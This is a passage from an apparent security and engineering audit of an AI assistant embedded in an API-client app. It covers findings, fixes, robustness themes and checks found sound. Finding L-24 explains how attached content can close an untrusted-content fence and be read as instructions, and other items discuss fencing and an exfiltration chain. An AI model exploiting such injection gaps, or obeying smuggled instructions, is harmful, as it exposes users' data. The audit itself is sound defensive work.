  - `update_tab_request` tells the model to take `tabId` from `get_active_context` (`schemas.ts:557`), although the tab-create results already return a `tabId`. Fix: mention both sources.
  - `open_page.section` (`schemas.ts:789-792`) is accepted for any page but only means something for settings. Fix: reject it for other pages.
  - There is no folder entity link (`systemPrompt.ts:59`). Fix: add a `relay://folder/` pill.
  - `get_workspace_summary` (`schemas.ts:316`) repeats the snapshot already sent with each request, and search and summary can't be paged. Fix: drop the tool or make it return the paged detail the snapshot omits.
  - There are parity gaps (accent colour, timeout/SSL/redirect writes, pin, saving GraphQL). Fix: add them, or list them as limitations in the system prompt.
- **L-23** A step-cap rejection would be reported as `tool_failed` with Retry (`route.ts:178-182`, `errors.ts:43`), so Retry replays the turn into the same cap. It is rarely reachable: the client's `shouldContinueToolLoop` uses the same cap and stops sending, so it takes a hand-built or stale request. Fix: return a distinct `step_cap` code with a "Continue" action instead of Retry (low value; see H-05).
- **L-24** The attachment detail fence can be closed by attached content (gap found in re-verification). `attachments.ts:11-12,136-172` joins resolved text between `<<<untrusted-attachment-detail>>>` and its end token without stripping, unlike `renderContext` (`systemPrompt.ts:68-75`) and `describeBody` (`workspaceRead.ts:445-464`). Names, URLs or scripts of imported collections or tab content can embed the close token and then read as instructions in the user turn. Fix: strip both tokens from each resolved section (reuse `stripDelimiters`, `workspaceRead.ts:443-449`).
- **L-25** The STT upstream call has no timeout or abort signal (gap found in re-verification). `stt/route.ts:64-70` calls `fetch(GROK_STT_URL, …)` with no `signal`; only `maxDuration = 60` (`:14`) bounds it, so with M-25 a stalled upstream ties up a function per request for up to 60 s. Fix: `signal: AbortSignal.timeout(...)` plus `req.signal`, and map the abort to `unavailable`.
- **L-26** A failed thread save is dropped with no retry or signal (gap found in re-verification). `threadDb.ts:321-337` `flushSave` deletes the entry from `pendingSaves` (`:324`) before the write, and the `catch` only `console.warn`s, so a transient IndexedDB error (quota, blocked upgrade) loses the settled turn while the UI shows it as saved. The `pagehide` flush (`:341-345`) has the same property. Fix: keep the entry until the write succeeds, and surface a "not saved" state after repeated failures.

## Fixed since the audit

IDs stay reserved; nothing was renumbered.

- **M-08 "Open in Relay" prefilled raw response headers and body** (fixed in `afd72ed`, polish-and-landing phase 1). `openInRelay.ts` now uses fixed `RELAY_ENTRY_PROMPTS` plus `isHumanPrompt` (80 characters, rejects newlines and `IMPORTANT:`), and `ResponsePanel.tsx:~662` passes `entry="summarizeResponse"`, so the composer gets a short fixed sentence. The model reads the response through `get_last_response`, which is fenced.
- **L-08 speechEngine and "Grok" remnants** (fixed in `f183457`, conversation-polish phase 5). `SPEECH_ENGINES`, the `speechEngine` input, `GROK_NOT_CONFIGURED` and the `changeLog.ts` snapshot field are gone from `schemas.ts`, `settingsWrite.ts` and `changeLog.ts`; no `grok`/`xai` remains in `src/lib/relay/tools`, `changeLog.ts`, `server/` or the locale files. What is left is STT internals (`stt/route.ts`, `MicButton.tsx`, `useGrokDictation`, constants), specs and docs, none model- or user-visible.

## Robustness opportunities (themes for the next epic)

1. **Turn lifecycle state machine.** Make turn state explicit (`idle → streaming → awaiting-user → running-tools → stopped | capped | errored`) and bind every queued tool to the thread and turn it was called in. This fixes H-01, H-05, H-06, M-01, M-20, M-21, M-22, L-03 and L-23 in one place.
2. **Risk-based approval, not kind-based.** Add a `risk(name, input)` layer so certain auto calls escalate to approval in Review mode:
   - script writes;
   - `shareValues → true`;
   - `sslVerify → false`;
   - base URL or header-template changes;
   - downloads.

   This fixes H-03, H-04, M-05, M-06 and L-05. Pair it with the H-02 image fix to close the exfiltration chain.
3. **One undo snapshot contract.** Have each entity adapter declare its dependents (chain ↔ collection, active environment, open tabs), with a property test that runs write → undo → deep-equals the store. This fixes H-09, M-11, M-12, M-13, L-14 and L-15.
4. **Symmetric tool I/O.** Use one shared vocabulary for reads and writes, make every write return what a follow-up read needs, and add the missing reads. This fixes M-02, M-15, M-19 and M-00.
5. **Tool loading by topic.** Use core tools plus topic groups, which cuts about 14k tokens (48k characters) per step and improves tool-choice accuracy. This fixes M-03 and helps M-16.
6. **Server metering as the only enforcement point.** Meter every model call, guard `/api/ai` and STT, and use a trusted IP source. This fixes H-08, M-25, M-28, M-29, M-30, L-02 and L-25.
7. **Live-model eval set.** Several promises (R6 scope, R1 "no collection for chains", BUG-03 no tool names) can only be checked against the real model. A small scripted eval run against DeepSeek with assertions on tool-call logs would turn these into repeatable checks.

## Checked and found sound

- Approval tokens are branded and minted only on a click, one per resolve and scoped to that call. The registry does not consume them (a `WeakSet`, `registry.ts:52-60`); reuse is prevented because `useRelayChat.ts:825` mints one per resolve and `pendingToolCalls` excludes running calls.
- Flipping the mode while a card is pending is safe, because the decision is recorded per call.
- `import_backup` is merge-only, ignores `rq_relay_permission_mode`, and returns counts only.
- The workspace context fence strips forged fence tokens, and the `get_last_response` body is fenced with the same stripping; its headers are only marked untrusted. Attachments are fenced, but that fence does not strip forged close tokens (L-24).
- `relay://` pills only resolve existing ids. Raw HTML is not rendered. `export_curl` masks auth headers.
- The step-cap math is exactly 12 and the notice matches. The cap is client-enforced; the server counts client-sent `step-start` parts (H-08).
- Clients can't inject a system role. Errors carry codes only, provider metadata is stripped, and telemetry stays local.
- All 74 tools have an implementation, a capability category and en/fr labels. en/fr/ja relay keys match.
- Double approval is guarded. Thread pruning at 50 is correct. 429 and offline errors are shown.
- `prompts/index.ts` is not a drift copy of `systemPrompt.ts`; it powers the inline AI actions.

## Out of scope and deliberately not flagged

- Streaming STT, LLM provider choice, cloud sync, backup encryption and scheduled backups.
- Relay being unable to change its own approval mode or wipe data. These are deny-list items by design.
- conversation-polish: phases 2–6 have shipped since the audit (`93309c7`, `65a0697`, `b056c10`, `f183457`, `ae305f9`). R4 change grouping covers chains only (L-21).
- Test-suite quality.
- Nits that did not hold up on re-check:
  - L-12, "unknown ids report success with '0 requests'": `findMissingRef` (`registry.ts:217-223`) runs before `run()` on the tools' `refs`, and ids are `min(1)`, so an unknown id returns `request not found`, and the bulk deletes already fail with "nothing to delete" (`destructive.ts:117,136,198`). The only residue, the approval card previewing 0, is part of L-06.
  - `create_request` accepting `ws://` (the HTTP url rule rejects it; only the WebSocket/Socket.IO rules allow it, `schemas.ts:203-209`).
  - `close_tab` needing an unlisted `tabId` (`get_active_context` returns it).

## Appendix: sub-auditor IDs → report IDs

Five sub-auditors produced the raw findings (row R is the 2026-11-08 re-verification): S (server loop), W (write tools vs Undo), A (approval and security), T (spec traceability and tool surface) and U (UI). Duplicates were merged.

| Area | Mapping |
|------|---------|
| S | S1→H-01 · S2→M-01 · S3→H-08 · S4→H-08 · S5→M-25 · S6→H-05 · S7→L-23 · S8→M-26 · S9→M-08 (fixed) · S10→L-03 · S11→L-01 · S12→L-02 |
| W | W1→H-09 · W2→H-07 · W3→M-13 · W4→L-21 · W5→M-10 · W6→M-09 · W7→M-11 · W8→M-12 · W9→L-09 · W10→L-10 · W11→M-14 · W12→L-11 · W13→L-12 (did not hold) · W14→L-13 · W15→L-08 (fixed) · W16→L-14 · W17, W18, W19→L-15 |
| A | A1→H-02 · A2→H-03 · A3→H-04 · A4, A5→M-05 · A6→M-06 · A7, A8→M-04 · A9→L-04 · A10→M-07 · A11→L-05 · A12→L-07 |
| T | T-1→M-00 · T-2→M-09 · T-3→M-02 · T-4→M-19 · T-5→M-18 · T-6→L-06 · T-7→M-03 · T-8→M-17 · T-9→M-16 · T-10→L-22 · T-11→M-15 · T-12→L-22 · T-13→M-27 · T-14→L-08 (fixed) · T-15→out of scope · T-16→L-01 · T-17→L-11, L-22 · T-18→L-22 |
| U | U1→H-01 · U2→M-01 · U3→M-20 · U4→H-06 · U5→M-21 · U6→M-22 · U7→L-03 · U8→M-23 · U9→M-24 · U10→L-16 · U11→L-17 · U12→L-18 · U13→L-19 · U14→L-08 (fixed) · U15→L-20 |
| R (re-verification 2026-11-08) | A:G-A1→M-28 · A:G-A2→M-29 · A:G-A3→M-30 · A:G-A4 and C:G-2→H-08 (extra bullet) · C:G-1→L-24 · B:G-1→L-25 · B:G-2→L-26 |
